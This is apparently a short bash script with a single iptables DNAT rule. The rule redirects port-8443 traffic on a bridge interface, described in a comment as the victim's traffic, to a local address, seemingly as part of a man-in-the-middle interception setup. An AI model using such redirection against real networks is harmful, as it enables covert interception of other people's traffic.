#!/bin/bash
#Any 8443 traffic with a destination of the victim
/sbin/iptables -t nat -A PREROUTING -i mibr -p tcp --dport 8443 -j DNAT --to 169.254.66.77:8443
